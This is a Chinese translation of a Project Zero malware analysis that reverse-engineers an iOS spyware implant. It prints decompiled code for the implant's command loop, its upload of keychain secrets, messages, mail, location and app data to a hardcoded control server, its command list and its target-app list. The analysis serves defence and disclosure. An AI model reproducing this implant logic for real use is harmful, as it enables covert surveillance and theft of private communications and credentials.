> 原文链接: https://www.anquanke.com//post/id/186456 


# 深入探索在野外发现的iOS漏洞利用链（七）


                                阅读量   
                                **456400**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者googleprojectzero，文章来源：googleprojectzero.blogspot.com
                                <br>原文地址：[https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html](https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t013ea5d7d4c6cd018b.jpg)](https://p4.ssl.qhimg.com/t013ea5d7d4c6cd018b.jpg)



在之前的文章中，我们研究了攻击者如何在iPhone上以root身份进行沙盒逃逸代码执行。在每个链的末尾都可以看到攻击者调用posix_spawn ，将路径传递给在/ tmp目录下的恶意二进制文件。植入代码在后台以root身份运行，iphone设备上不会有任何信息显示代码正在后台执行。iOS上的用户无法查看进程列表，因此恶意二进制文件将自己从系统中隐藏。 注入代码主要目的是窃取文件和上传实时位置数据，植入代码每60秒从控制服务器请求命令。



## 0x01 软件示例

在深入研究代码之前，让我们看看运行注入代码的测试手机中的一些样本数据，并与我开发的自定义命令和控制服务器进行通信。为了清楚起见，我做了一个专门用于测试后演示植入代码可以做什么的设备。这个设备是运行iOS 12的iPhone 8. 植入代码可以访问端到端的加密应用程序（如Whatsapp，Telegram和iMessage）使用的所有数据库文件（在受害者的手机上）。左侧是应用程序的屏幕截图，右侧是植入代码窃取的数据库文件的内容，其中包含使用应用程序发送和接收的消息的未加密明文：

#### <a class="reference-link" name="Whatsapp"></a>Whatsapp

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015f149574ba8a9558.png)

#### <a class="reference-link" name="Telegram"></a>Telegram

[![](https://p1.ssl.qhimg.com/t0164f0d2af95993d26.png)](https://p1.ssl.qhimg.com/t0164f0d2af95993d26.png)

#### <a class="reference-link" name="iMessage"></a>iMessage

[![](https://p2.ssl.qhimg.com/t0198d8312f28b946af.png)](https://p2.ssl.qhimg.com/t0198d8312f28b946af.png)

#### <a class="reference-link" name="Hangouts"></a>Hangouts

以下是Google Hangouts 在iOS中的对话以及上传的相应数据库文件。通过一些基本的SQL，我们可以轻松地看到消息的纯文本，甚至是共享图像的URL。

[![](https://p1.ssl.qhimg.com/t01a90e89851e899f9b.png)](https://p1.ssl.qhimg.com/t01a90e89851e899f9b.png)

植入代码可以上传设备上所有应用程序使用的私人文件;，以下是通过Gmail发送的电子邮件明文内容的示例，这些内容会上传到攻击者的服务器：

#### <a class="reference-link" name="Gmail"></a>Gmail

[![](https://p4.ssl.qhimg.com/t013d2299f9d96a3bf7.png)](https://p4.ssl.qhimg.com/t013d2299f9d96a3bf7.png)

**Contacts**

植入代码会保存用户完整联系人数据库的副本：

[![](https://p0.ssl.qhimg.com/t01bc9433922ac8e4d4.png)](https://p0.ssl.qhimg.com/t01bc9433922ac8e4d4.png)

**Photos**

拍下所有照片的副本：

[![](https://p4.ssl.qhimg.com/t012460753b9f8a5c28.png)](https://p4.ssl.qhimg.com/t012460753b9f8a5c28.png)

**实时GPS跟踪**

如果设备在线，植入代码还可以实时上传用户的位置，每分钟最多一次。以下是当我带着存在植入代码的手机上运行时，收集的实时位置数据的真实样本：

[![](https://p1.ssl.qhimg.com/t01ce7e9df0fdd8e46c.png)](https://p1.ssl.qhimg.com/t01ce7e9df0fdd8e46c.png)

植入代码会上传设备的凭证信息，其中包含设备上使用的大量凭证和证书。例如，所有已保存的WiFi接入点的SSID和密码：

```
&lt;dict&gt;
           &lt;key&gt;UUID&lt;/key&gt;
           &lt;string&gt;3A9861A1-108E-4B3A-AAEC-C8C9DC79878E&lt;/string&gt;
     &lt;key&gt;acct&lt;/key&gt;
           &lt;string&gt;RandomHotelWifiNetwork&lt;/string&gt;
           &lt;key&gt;agrp&lt;/key&gt;
           &lt;string&gt;apple&lt;/string&gt;
           &lt;key&gt;cdat&lt;/key&gt;
           &lt;date&gt;2019-08-28T08:47:33Z&lt;/date&gt;
           &lt;key&gt;class&lt;/key&gt;
           &lt;string&gt;genp&lt;/string&gt;
           &lt;key&gt;mdat&lt;/key&gt;
           &lt;date&gt;2019-08-28T08:47:33Z&lt;/date&gt;
           &lt;key&gt;musr&lt;/key&gt;
           &lt;data&gt;
           &lt;/data&gt;
           &lt;key&gt;pdmn&lt;/key&gt;
           &lt;string&gt;ck&lt;/string&gt;
           &lt;key&gt;persistref&lt;/key&gt;
           &lt;data&gt;
           &lt;/data&gt;
           &lt;key&gt;sha1&lt;/key&gt;
           &lt;data&gt;
           1FcMkQWZGn3Iol70BW6hkbxQ2rQ=
           &lt;/data&gt;
           &lt;key&gt;svce&lt;/key&gt;
           &lt;string&gt;AirPort&lt;/string&gt;
           &lt;key&gt;sync&lt;/key&gt;
           &lt;integer&gt;0&lt;/integer&gt;
           &lt;key&gt;tomb&lt;/key&gt;
           &lt;integer&gt;0&lt;/integer&gt;
           &lt;key&gt;v_Data&lt;/key&gt;
           &lt;data&gt;
           YWJjZDEyMzQ=
           &lt;/data&gt;
   &lt;/dict&gt;
```

该V_DATA 是明文密码，存储的为base64：

```
$ echo YWJjZDEyMzQ = | base64 -D
ABCD1234
```

key串还包含Google的iOS单点登录等服务所使用的长期令牌，以使Google应用程序能够访问用户的帐户。这些内容将上传给攻击者，然后可用于维护对用户Google帐户的访问权限，即使植入代码不再运行也会继续上传。以下是使用用于在单独计算机上登录Gmail网络界面的可以串中存储为com.google.sso.optional.1.accessToken 的Google OAuth令牌的示例：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013bd1b8fbd3728c93.png)

#### <a class="reference-link" name="%E5%88%86%E6%9E%90"></a>分析

植入代码嵌入在**DATA：**文件中，从我们对漏洞的分析中，我们发现假的内核任务端口（它提供内核内存读写服务）总是在内核漏洞利用结束时被销毁。植入代码完全在用户空间中运行，并且以root身份在运行，攻击者提升了权限以确保他们可以访问他们感兴趣的所有私人数据。使用[jtool](http://www.newosxbook.com/tools/jtool.html)可以查看植入代码具有的权限。攻击者可以完全控制这些内容，因为他们使用内核漏洞将植入的二进制代码签名的哈希值添加到内核信任缓存中了。

```
$ jtool --ent implant
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;keychain-access-groups&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;*&lt;/string&gt;
&lt;/array&gt;
        &lt;key&gt;application-identifier&lt;/key&gt;
        &lt;string&gt;$(AppIdentifierPrefix)$(CFBundleIdentifier)&lt;/string&gt;
        &lt;key&gt;com.apple.locationd.preauthorized&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;com.apple.coretelephony.Identity.get&lt;/key&gt;
        &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

iOS上的许多系统服务将尝试检查与其通信的客户端的权限，并且仅允许具有特定权限的客户端执行某些操作。这就是为什么即使植入代码以root身份运行并且实现了沙盒逃逸，它仍然需要有效的权限。

分配了三个相关的权限：

[keychain-access-groups](https://developer.apple.com/documentation/bundleresources/entitlements/keychain-access-groups?language=objc)用于限制对存储在key串中数据的访问，只要启用了位置服务，就会添加一个通配值。

[com.apple.locationd.preauthorized](https://stackoverflow.com/questions/25608339/get-iphone-location-in-ios-without-preference-location-services-set-to-on)可以在未经用户同意的情况下使用CoreLocation 。

[com.apple.coretelephony.Identity.get](http://iphonedevwiki.net/index.php/CoreTelephony.framework)允许检索设备的电话号码。



## 0x02 逆向分析

二进制文件编译的时候没有优化，主要是用Objective-C编写的，下面的代码片段大多是手工反编译的，有一些来自 [hex-rays](https://www.hex-rays.com/)。

#### <a class="reference-link" name="%E7%BB%93%E6%9E%84%E4%BD%93"></a>结构体

植入代码由两个Objective-C类组成：Service 和Util 以及各种辅助函数。植入代码开始于创建Service 类的实例并在获取当前[runloop](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/Multithreading/RunLoopManagement/RunLoopManagement.html)的句柄运行它之前调用start selector。

```
-[Service start] `{`
  [self startTimer];
  [self upload];
`}`
```

[Service startTimer] 将会每60秒调用一次Service 实例的timerHandle 方法：

```
// call timer_handle every 60 seconds
-[Service startTimer] `{`
  timer = [NSTimer scheduledTimerWithTimeInterval:60.0
                                        target:self
                                        selector:SEL(timer_handle)
                                        userInfo:NULL
                                        repeats:1]
  old_timer = self-&gt;_timer;
  self-&gt;_timer = timer;
  [old_timer release]
`}`
```

timer_handle 是负责处理命令和控制通信的主要函数，在设备进入timer_handle 循环之前，首先进行上传：

```
-[Service upload] `{`
  [self uploadDevice];
  [self requestLocation];
  [self requestContacts];
  [self requestCallHistory];
  [self requestMessage];
  [self requestNotes];
  [self requestApps];
  [self requestKeychain];
  [self requestRecordings];
  [self requestSmsAttachments];
  [self requestSystemMail];
  if (!self-&gt;_defaultList) `{`
    self-&gt;_defaultList = [Util appPriorLists];
  `}`

  [self requestPriorAppData:self-&gt;_defaultList];
  [self requestPhotoData];

  ...
`}`
```

从设备批量上传数据。来看看是如何实现的：

```
-[Service uploadDevice] `{`
  NSLog(@"uploadDevice");
  info = [Util dictOfDeviceInfo];
  while( [self postFiles:info remove:1] == 0) `{`
    [NSThread sleepForTimeInterval:10.0];
    info = [Util dictOfDeviceInfo];
  `}`
`}`
```

NSLog 的调用确实存在植入代码于中，如果通过数据线将iPhone连接到Mac并打开Console.app，可以在植入代码运行时看到这些日志消息。

[Util dictOfDeviceInfo] ：

```
+[Util dictOfDeviceInfo] `{`
  struct utsname name = `{``}`;
  uname(&amp;name);
  machine_str = [NSString stringWithCString:name.machine
                          encoding:NSUTF8StringEncoding]

   // CoreTelephony private API
  device_phone_number = CTSettingCopyMyPhoneNumber();
  if (!device_phone_number) `{`
    device_phone_number = @"";
  `}`

  net_str = @"Cellular"
  if ([self isWifi]) `{`
    net_str = @"Wifi";
  `}`

  dict = @`{`@"name":         [[UIDevice currentDevice] name],
           @"iccid":        [self ICCID],
           @"imei":         [self IMEI],
           @"SerialNumber": [self SerialNumber],
           @"PhoneNumber":  device_phone_number,
           @"version":      [[UIDevice currentDevice] systemVersion]],
           @"totaldisk":    [NSNumber numberWithFloat:
                              [[self getTotalDiskSpace] stringValue]],
           @"freedisk":     [NSNumber numberWithFloat:
                              [[self getFreeDiskSpace] stringValue]],
           @"platform":     machine_str,
           @"net":          net_str`}`

  path = [@"/tmp" stringByAppendingPathComponent:[NSUUID UUIDString]];

  [dict writeToFile:path atomically:1]

  return @`{`@"device.plist": path`}`
`}`
```

这是在我的一个测试设备上运行植入代码时发送到服务器的输出数据：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;PhoneNumber&lt;/key&gt;
&lt;string&gt;+447848473659&lt;/string&gt;
&lt;key&gt;SerialNumber&lt;/key&gt;
&lt;string&gt;F4GW60LKJC68&lt;/string&gt;
&lt;key&gt;freedisk&lt;/key&gt;
&lt;string&gt;48.63801&lt;/string&gt;
&lt;key&gt;iccid&lt;/key&gt;
&lt;string&gt;8944200115179096289&lt;/string&gt;
&lt;key&gt;imei&lt;/key&gt;
&lt;string&gt;352990092967294&lt;/string&gt;
&lt;key&gt;name&lt;/key&gt;
&lt;string&gt;Ian Beer’s iPhone&lt;/string&gt;
&lt;key&gt;net&lt;/key&gt;
&lt;string&gt;Wifi&lt;/string&gt;
&lt;key&gt;platform&lt;/key&gt;
&lt;string&gt;iPhone10,4&lt;/string&gt;
&lt;key&gt;totaldisk&lt;/key&gt;
&lt;string&gt;59.59484&lt;/string&gt;
&lt;key&gt;version&lt;/key&gt;
&lt;string&gt;12.1.2&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

此方法从设备收集大量标识符：
- iPhone型号
- iPhone名称
- SIM卡的[ICCID](https://en.wikipedia.org/wiki/SIM_card#ICCID)，用于唯一标识SIM卡
- iPhone序列号
- 当前的电话号码
- iOS版本
- 可用磁盘空间总和
- 当前活动的网络接口（wifi或蜂窝网络）
构建一个包含所有这些信息的Objective-C字典对象，然后使用[NSUUID](https://developer.apple.com/documentation/foundation/nsuuid?language=objc)类生成一个伪随机的唯一字符串。他们使用该字符串在/ tmp 下创建一个新文件，例如/ tmp / 68753A44-4D6F-1226-9C60-0050E4C00067 。它们将字典对象作为XML序列化到该文件中，并返回字典@ `{`@“device.plist”：path`}`，将名称“ device.plist ” 映射到/ tmp中的路径。在整个植入代码文件中使用都是这种将所有内容序列化为/ tmp中文件的设计模式。

[ServeruploadDevice]将返回的@ `{`@“device.plist”：path`}` 字典传递给[Service postFiles] ：

```
[self postFiles:info remove:1]
```

```
-[Service postFiles:files remove:] `{`
  if([[files allKeys] count] == 0) `{`
    return;
  `}`

  sem = dispatch_semaphore_create(0.0)

  base_url_str = [
    [@"http://X.X.X.X" stringByTrimmingCharactersInSet:
                         [NSCharacterSet whitespaceAndNewlineCharacterSet]]]

  full_url_str = [base_url_str stringByAppendingString:@"/upload/info"]

  url = [NSURL URLWithString:full_url_string]

  req = [NSMutableURLRequest requestWithURL:url]
  [req setHTTPMethod:@"POST"]
  [req setTimeoutInterval:120.0]

  content_type_str = [NSString stringWithFormat:
    "multipart/form-data; charset=utf-8;boundary=%@", @"9ff7172192b7"];
  [req setValue:content_type_str forHTTPHeaderField:@"Content-Type"]

  // this is set in [Service init], it's SerialNumber
  // from [Util SerialNumber]
  params_dict = @`{`@"sn": self-&gt;_sn`}`
  body_data = [self buildBodyDataWithParams:params_dict AndFiles:files]

  session = [NSURLSession sharedSession]
  NSURLSessionUploadTask* task = [session uploadTaskWithRequest:req
           fromData:body_data
           completionHandler:
             ^(NSData *data, NSURLResponse *response, NSError *error)`{`

                if (error) `{`
                  NSLog(@"postFile %@ Error: %@", _, _)
                `}` else `{`
                  NSLog(@"postFile success %@");
                `}`

                if (remove) `{`
                  // use NSFileManager to remove all the files
                `}`

                dispatch_semaphore_signal(sem)

             `}`]

  [task resume];

  dispatch_semaphore_wait(sem, -1);
```

用于上传内容的服务器的IP地址在植入代码文件中是硬编码的。此函数使用该地址发出HTTP POST 请求，将files 参数中提供的文件内容作为multipart / form-data payload传递，使用硬编码字符串“ 9ff7172192b7 ”分隔正文数据中的字段。

快速浏览一下buildBodyDataWithParams ：

```
[-Service buildBodyDataWithParams:params AndFiles:files] `{`
  data = [NSMutableData data]
  for (key in params) `{`
    str = [NSMutableString string]
    // the boundary string
    [str appendFormat:@"--%@rn", "9ff7172192b7"] ;
    [str appendFormat:
      @"Content-Disposition: form-data; name="%@"rnrn", key];

    val = [params objectForKeyedSubscript:key];
    [str appendFormat:@"%@rn", val];

    encoded = [str dataUsingEncoding:NSUTF8StringEncoding];
    [data appendData:encoded]
  `}`

  for (file in files) `{`
    str = [NSMutableString string];
    // the boundary string
    [str appendFormat:@"--%@rn", "9ff7172192b7"] ;
    [str appendFormat:
      @"Content-disposition: form-data; name="%@"; filename="%@"rn",
      file, file];
    [str appendFormat:@"Content-Type: application/octet-streamrnrn"];

    encoded = [str dataUsingEncoding:NSUTF8StringEncoding];
    [data appendData:encoded];

    file_path = [files objectForKeyedSubscript:file];
    file_data = [NSData dataWithContentsOfFile:file_path];
    [data appendData:file_data];

    newline_encoded = [@"rn" dataUsingEncoding:NSUTF8StringEncoding];
    [data appendData newline_encoded] ;   
  `}`

  final_str = [NSString stringWithFormat:@"--%@--rn", @"9ff7172192b7"];
  final_encoded = [final_str dataUsingEncoding:NSUTF8StringEncoding];
  [data appendData:final_encoded];

  return data
`}`
```

构建一个HTTP POST 请求主体，将每个文件的内容嵌入为表单数据。确实通过HTTP （而不是HTTPS ）对所有内容进行POST发送，并且不会对上传的数据做非对称加密。现在一切都很清楚了，如果你连接到未加密的WiFi网络上，就会向你周围的所有人，你的网络运营商和任何中间网络广播这些信息，以便向命令和控制服务器广播。

这意味着消息传递应用程序提供的端到端加密的信息会被监听;，而且攻击者通过网络以纯文本形式将端到端加密消息的所有内容发送到他们的服务器上。

#### <a class="reference-link" name="%E5%91%BD%E4%BB%A4%E5%BE%AA%E7%8E%AF"></a>命令循环

在iPhone设备被利用之后，在初始运行时植入代码在进入睡眠状态之前以类似的方式执行大约十二次批量上传，并且每60秒被操作系统唤醒一次。

NSTimer将确保每60秒调用[Service timer_handle] 方法一次：

```
-[Service timer_handle] `{`
  NSLog(@"timer trig")
  [self status];
  [self cmds];
`}`
```

[Service status] 使用[SystemConfiguration](https://developer.apple.com/documentation/systemconfiguration?language=objc)框架确定设备当前是通过WiFi还是移动数据网络连接。

[Service cmds] 调用[Service remotelist] ：

```
-[Service cmds] `{`
  NSLog(@"cmds");
  [self remotelist];
  NSLog(@"finally");
`}`
```

```
-[Service remotelist] `{`
  ws_nl = [NSCharacterSet whitespaceAndNewlineCharacterSet];
  url_str = [remote_url_long stringByTrimmingCharacterInSet:ws_nl];

  NSMutableURLRequestRef url_req = [NSMutableURLRequest alloc];

  full_url_str = [url_str stringByAppendingString:@"/list"];
  NSURLRef url = [NSURL URLWithString:full_url_str];

  [url_req initWithURL:url];

  if (self-&gt;_cookies) `{`
    [url_req addValue:self-&gt;_cookies forHeader:@"Cookie"];
  `}`

  NSURLResponse* resp;
  NSData* data = [NSURLConnection sendSynchronousRequest:url_req
     returningResponse:&amp;resp
     error:0];

  cookie = [self getCookieFromHttpresponse:resp];
  if ([cookie length] != 0) `{`
    self-&gt;_cookie = cookie;
  `}`

  NSLog(@"Json data %@", [NSString initWithData:data
                                   encoding:NSUTF8StringEncoding]);

  err = 0;
  json = [NSJSONSerialization JSONObjectWithData:data
                              options:0
                              error:&amp;err];

  data_obj = [json objectForKey:@"data"];

  NSLog(@"data Result: %@", data_obj);

  cmds_obj = [data_obj objectForKey:@"cmds"];

  NSLog(@"cmds: %@", cmds_obj);

  for (cmd in cmds_obj) `{`
    [self doCommand:cmd];
  `}`
`}`
```

此方法向命令和控制服务器上的/ list 端点发出HTTP请求，并在响应中接收JSON 编码对象。它使用系统JSON 库（[NSJSONSerialization](https://developer.apple.com/documentation/foundation/nsjsonserialization)）解析该对象，JSON 采用以下形式：

```
`{` "data" : 
  `{` "cmds" :
    [
      `{`"cmd"  : &lt;COMMAND_STRING&gt;
       "data" : &lt;OPTIONAL_DATA_STRING&gt;
      `}`, ...
    ]
  `}`
`}`
```

每个附带的命令依次传递给[Service doCommand] ：

```
-[Service doCommand:cmd_dict] `{`
  cmd_str_raw = [cmd_dict objectForKeyedSubscript:@"cmd"]

  cmd_str = [cmd_str_raw stringByTrimmingCharactersInSet:
               [NSCharacterSet whitespaceAndNewlineCharacterSet]];

  if ([cmd_str isEqualToString:@"systemmail"]) `{`
    [self requestSystemMail];
  `}` else if([cmd_str isEqualToString:@"device"]) `{`
    [self uploadDevice];
  `}` else if([cmd_str isEqualToString:@"locate"]) `{`
    [self requestLocation];
  `}` else if([cmd_str isEqualToString:@"contact"]) `{`
    [self requestContact];
  `}` else if([cmd_str isEqualToString:@"callhistory"]) `{`
    [self requestCallHistory];
  `}` else if([cmd_str isEqualToString:@"message"]) `{`
    [self requestMessage];
  `}` else if([cmd_str isEqualToString:@"notes"]) `{`
    [self requestNotes];
  `}` else if([cmd_str isEqualToString:@"applist"]) `{`
    [self requestApps];
  `}` else if([cmd_str isEqualToString:@"keychain"]) `{`
    [self requestKeychain];
  `}` else if([cmd_str isEqualToString:@"recordings"]) `{`
    [self requestRecordings];
  `}` else if([cmd_str isEqualToString:@"msgattach"]) `{`
    [self requestSmsAttachments];
  `}` else if([cmd_str isEqualToString:@"priorapps"]) `{`
    if (!self-&gt;_defaultList) `{`
      self-&gt;_defaultList = [Util appPriorLists]
    `}`
    [self requestPriorAppData:self-&gt;_defaultList]
  `}` else if([cmd_str isEqualToString:@"photo"]) `{`
    [self uploadPhoto];
  `}` else if([cmd_str isEqualToString:@"allapp"]) `{`
    dispatch_async(_dispatch_main_q, ^(app)
      `{`
        [self requestAllAppData:app]
      `}`);
  `}` else if([cmd_str isEqualToString:@"app"]) `{`
    // parameter should be an array of bundle ids
    data = [cmd_dict objectForKey:@"data"]
    if ([data count] != 0) `{`
      [self requestPriorAppData:data]
    `}`
  `}` else if([cmd_str isEqualToString:@"dl"]) `{`
    [@"/tmp/evd." stringByAppendingString:[[[NSUUID UUID] UUIDString] substringToIndex: 4]]
    // it doesn't actually seem to do anything here
  `}` else if([cmd_str isEqualToString:@"shot"]) `{`
    // nop
  `}` else if([cmd_str isEqualToString:@"live"]) `{`
    // nop
  `}`

  cs = [NSCharacterSet whitespaceAndNewlineCharacterSet];
  server = [@"http://X.X.X.X:1234" stringByTrimmingCharactersInSet:cs];

  full_url_str = [server stringByAppendingString:@"/list/suc?name="];
  url = [NSURL URLWithString:[full_url_str stringByAppendingString:cmd_str]];
  NSLog(@"s_url: %@", url)

  req = [[NSMutableURLRequest alloc] initWithURL:url];
  if (self-&gt;_cookies) `{`
    [req addValue:self-&gt;_cookies forHTTPHeaderField:@"Cookie"];
  `}`

  id resp;
  [NSURLConnection sendSynchronousRequest:req
                   returningResponse: &amp;resp
                   error: nil];

  resp_cookie = [self getCookieFromHttpresponse:resp]
  if ([resp_cookie length] == 0) `{`
    self-&gt;_cookie = nil;
  `}` else `{`
    self-&gt;_cookie = resp_cookie;
  `}`

  NSLog(@"cookies: %@", self-&gt;_cookie)
`}`
```

此方法使用带有命令和可选数据参数的字典。以下是支持的命令列表：

```
systemmail  : upload email from the default Mail.app
device      : upload device identifiers
               (IMEI, phone number, serial number etc)
locate      : upload location from CoreLocation
contact     : upload contacts database
callhistory : upload phone call history 
message     : upload iMessage/SMSes
notes       : upload notes made in Notes.app
applist     : upload a list of installed non-Apple apps
keychain    : upload passwords and certificates stored in the keychain
recordings  : upload voice memos made using the built-in voice memos app
msgattach   : upload SMS and iMessage attachments
priorapps   : upload app-container directories from hardcoded list of
                third-party apps if installed (appPriorLists)
photo       : upload photos from the camera roll
allapp      : upload container directories of all apps
app         : upload container directories of particular apps by bundle ID
dl          : unimplemented
shot        : unimplemented
live        : unimplemented
```

每个命令负责将其结果上传到服务器上。每个命令完成后，对/ list/suc?name =X端点发出GET 请求，其中X是完成的命令的名称。包含设备序列号的cookie与GET请求一起发送。这些命令中通过基于所需信息和正在运行的iOS版本创建固定目录列表的tar来工作。

例如，这里是systemmail 命令的实现：

```
-[Service requestSystemMail] `{`
  NSLog(@"requestSystemMail")
  maildir = [Util dirOfSystemMail]
  if ([maildir length] != 0) `{`
    [Util tarWithSplit:maildir
          name:@"systemmail"
          block:^(id files) // dictionary `{`filename:filepath`}` 
          `{`
            while ([self postFiles:files] == 0) `{`
              [NSThread sleepForTimeInterval:10.0]
            `}`
          `}`
    ]
  `}`
`}`

+[Util dirOfSystemMail] `{`
  return @"/private/var/mobile/Library/Mail";
`}`
```

使用[Util tarWithSplit]方法来存档/private/var/mobile/Library/Mail 文件夹中的内容，其中包含使用内置Apple Mail.app 发送和接收的所有本地存储电子邮件的内容。

这是命令locate的另一个示例，它使用CoreLocation为设备请求地理定位修复。由于植入代码的com.apple.locationd.preauthorized 权利设置为true，因此不会提示用户访问其位置的权限。

```
-[Service requestLocation] `{`
  NSLog(@"requestLocation");
  self-&gt;_locating = 1;

  if (!self-&gt;_lm) `{`
    lm = [[CLLocationManager alloc] init];
    [self-&gt;_lm release];
    self-&gt;_lm = lm;

    // the delegate's locationManager:didUpdateLocations: selector
    // will be called when location information is available
    [self-&gt;_lm setDelegate:self];
    [self-&gt;_lm setDesiredAccuracy:kCLLocationAccuracyBest];
  `}`

  [self-&gt;lm startUpdatingLocation];
`}`

-[Service locationManager:manager didUpdateLocations:locations] `{`
  [self stopUpdatingLocation];
  loc = [locations lastObject];
  if (self-&gt;_locating) `{`
    struct CLLocationCoordinate2D coord = [loc coordinate];
    dict = @`{`@"lat" : [NSNumber numberWithDouble:coord.latitude],
             @"lon" : [NSNumber numberWithDouble:coord.longitude]`}`;

    path = [@"/tmp" stringByAppendingPathComponent[NSUUID UUIDString];
    [dict writeToFile:path atomically:1];

    while(1)`{`
      fdict = @`{`@"gps.plist": path`}`;
      if([self postFiles:fdict remove:1]) `{`
        break;
      `}`

      [NSThread sleepForTimeInterval:10.0];
  `}`
`}`
```

这是对location命令的响应，可以每隔60秒发送一次（注意：我已将位置改成了瑞士马特宏峰的顶点）：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;lat&lt;/key&gt;
&lt;real&gt;45.976451000646013&lt;/real&gt;
&lt;key&gt;lng&lt;/key&gt;
&lt;real&gt;7.6585657688044914&lt;/real&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

#### <a class="reference-link" name="%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9"></a>文本内容

各种植入命令使攻击者能够窃取第三方应用程序的内容目录。植入代码包含一个硬编码的应用程序列表，当植入代码启动时，它们将始终上传其内容目录。命令和控制服务器还可以查询所有第三方应用程序的列表并请求上传到其文件目录中。这些文件目录是大多数iOS应用程序存储其所有数据的地方。

例如，这是端到端加密应用程序存储所有已发送和已接收消息的未加密副本的位置。 以下是第三方应用程序的预先填充的软件包标识符列表，如果安装了应用程序，它们将上传到其文件目录中：

```
com.yahoo.Aerogram
com.microsoft.Office.Outlook
com.netease.mailmaster
com.rebelvox.voxer-lite
com.viber
com.google.Gmail
ph.telegra.Telegraph
com.tencent.qqmail
com.atebits.Tweetie2
net.whatsapp.WhatsApp
com.skype.skype
com.facebook.Facebook
com.tencent.xin
```

如果攻击者对设备上安装的其他应用感兴趣，他们可以使用applist 和app 命令的组合来获取所有已安装的应用ID的列表，然后按ID上传特定应用的内容目录。该allapp 命令将上传所有设备上的所有应用程序的内容目录。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"></a>漏洞影响

植入代码可以访问设备上几乎所有可用的个人信息，它可以将未加密的信息上传到攻击者的服务器。植入的二进制文件不会持续存在于设备上。 如果手机重新启动，则当用户再次访问受感染的站点时，植入代码将无法运行，必须重新利用该设备。

鉴于信息被盗的广度，攻击者仍然可以通过使用来自key串的被盗认证令牌来维持对各种帐户和服务的持久访问，即使他们临时失去了对设备的访问权限。
